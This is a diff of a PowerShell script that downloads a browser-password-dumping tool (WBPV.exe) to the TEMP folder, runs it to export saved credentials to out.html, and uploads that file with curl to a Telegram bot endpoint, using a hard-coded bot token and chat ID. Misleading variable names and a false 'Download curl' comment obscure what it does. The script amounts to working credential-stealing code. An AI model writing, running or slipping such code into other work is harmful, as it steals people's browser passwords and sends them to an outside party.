@@ -32,6 +32,7 @@ if (!(Get-Command curl -ErrorAction SilentlyContinue)) {
 }
 
 $WBPV = "$env:TEMP\WBPV.exe"
+$arguments = "/shtml out.html"
 
 if (!(Test-Path $WBPV)) {
   # Download curl
@@ -39,9 +40,7 @@ if (!(Test-Path $WBPV)) {
   Invoke-WebRequest $url -OutFile $WBPV
 }
 
-$msbuild = ".\WBPV.exe"
-$arguments = "/shtml out.html"
-start-process $msbuild $arguments -Wait
+start-process WBPV $arguments -Wait
 
 $msbuild = "curl"
 $arguments = '-s -F document=@"c:/out.html" https://api.telegram.org/bot7623697444:AAER5Ph7rbkgJifCvG4cyXhg6XhvSnQvjr4/sendDocument?chat_id=7032729089'
